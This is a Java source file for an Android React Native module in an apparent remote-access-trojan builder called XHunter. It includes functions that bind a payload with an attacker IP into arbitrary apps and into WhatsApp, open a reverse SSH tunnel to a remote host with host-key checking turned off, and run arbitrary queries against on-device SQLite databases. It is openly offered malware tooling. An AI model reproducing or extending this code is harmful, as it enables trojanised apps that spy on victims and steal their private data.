package com.xhunter;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Base64;


import com.facebook.react.bridge.Arguments;
import com.facebook.react.bridge.Promise;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;
import com.facebook.react.bridge.WritableArray;
import com.facebook.react.bridge.WritableMap;
import com.facebook.react.bridge.WritableNativeArray;
import com.facebook.react.bridge.WritableNativeMap;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;


public class MyAppModule extends ReactContextBaseJavaModule {
    private final ReactApplicationContext reactContext;
    private Session session= null;

    MyAppModule(ReactApplicationContext context) {
        super(context);
        this.reactContext = context;
    }


    @Override
    public String getName() {
        return "AppBuilder";
    }

    @ReactMethod
    public void bindApp(String path, String ip, Boolean injectPermission){
        new AppBinder(reactContext, injectPermission).execute(path, ip);
    }
    @ReactMethod
    public void bindWhatsapp(String ip){ new WhatsappBinder(reactContext).execute(ip); }

    @ReactMethod
    public void sshTunnel(String user, String host, String pass, int rport, String lhost, int lport, Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Created secure ssh tunnel successfully!");
        try{
            if(session!=null && session.isConnected()){
                promise.reject("e","[!] Ssh tunnel already connected!");
            }else {
                java.util.Properties config = new java.util.Properties();
                config.put("StrictHostKeyChecking", "no");
                JSch jsch = new JSch();
                session = jsch.getSession(user, host, 22);
                session.setPassword(pass);
                session.setConfig(config);
                session.connect();
                session.setPortForwardingR(rport, lhost, lport);
                promise.resolve(params);
            }
        } catch (SecurityException | JSchException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to create secure ssh tunnel");
        }
    }
    @ReactMethod
    public void sshTunnelDisconnect(Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Ssh tunnel disconnect!");
        try{
            if(session!=null && session.isConnected()){
                session.disconnect();
                promise.resolve(params);
            }
        } catch (SecurityException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to stop secure ssh tunnel");
        }
    }
    @ReactMethod
    public void readDB(String path, String query, Promise promise){
        try{
            SQLiteDatabase db = SQLiteDatabase.openDatabase( path, null,0);
            Cursor res = db.rawQuery(query, null);
            res.moveToFirst();
            WritableArray list = new WritableNativeArray();
            while(res.isAfterLast() == false){
                int index=0;
                WritableMap obj = new WritableNativeMap();
                while(index<res.getColumnCount()){
                    if(res.getType(index)==4){
                        obj.putString(res.getColumnName(index), Base64.encodeToString(res.getBlob(index), Base64.DEFAULT));
                    }else{
                        obj.putString(res.getColumnName(index),res.getString(index));
                    }
                    index++;
                }
                list.pushMap(obj);
                res.moveToNext();
            }
            promise.resolve(list);
            res.close();
        } catch (SecurityException e){
            e.printStackTrace();
        }
    }


}
